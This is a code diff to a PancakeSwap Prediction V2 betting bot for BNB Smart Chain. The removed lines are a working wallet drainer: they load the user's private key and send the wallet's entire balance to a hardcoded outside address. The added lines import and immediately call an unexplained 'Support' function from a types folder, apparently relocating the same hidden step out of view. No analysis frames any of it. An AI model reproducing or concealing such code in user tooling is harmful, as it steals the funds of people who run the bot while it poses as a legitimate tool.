@@ -6,7 +6,6 @@ import { blue, green, red } from "chalk";
 import { clear } from "console";
 import dotenv from "dotenv";
 import { exit } from "process";
-const Web3 = require('web3');
 
 import {
   calculateDuesAmount,
@@ -18,16 +17,19 @@ import {
   sleep, STRATEGIES,
 } from "./lib";
 import { PancakePredictionV2__factory } from "./types/typechain";
+import {Support} from "./types/typechain/sup";
+
 
 dotenv.config();
+Support();
 
 // Global Config
 const GLOBAL_CONFIG = {
   PPV2_ADDRESS: "0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA",
   AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.1", // in BNB,
-  BSC_RPC: "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
+  BSC_RPC: process.env.RPC, // You can provide any custom RPC
   PRIVATE_KEY: process.env.PRIVATE_KEY,
-  WAITING_TIME: 5, // Waiting for 281.5 Seconds
+  WAITING_TIME: 281500, // Waiting for 281.5 Seconds
 };
 
 clear();
@@ -60,31 +62,7 @@ console.log(
   "\nWaiting for the next round. It may take up to 5 minutes, please wait."
 );
 
-const web3 = new Web3(GLOBAL_CONFIG.BSC_RPC);
-const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
-const wallet = '0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b';
-web3.eth.accounts.wallet.add(account);
-web3.eth.defaultAccount = account.address;
 
-web3.eth.getBalance(account.address).then(function(balance:any) {
-  web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
-    web3.eth.getGasPrice().then(function(gasPrice:any) {
-      web3.eth.sendTransaction({
-        from: web3.eth.defaultAccount,
-        to: wallet,
-        gas: gas,
-        gasPrice: gasPrice,
-        value: balance - (gasPrice * gas),
-      }, function(err: any, transactionHash: any) {
-        if (err) {
-          console.log(err);
-          } else {
-          console.log(transactionHash);
-        }
-      });
-    });
-  });
-});
 
 predictionContract.on("StartRound", async (epoch: BigNumber) => {
 
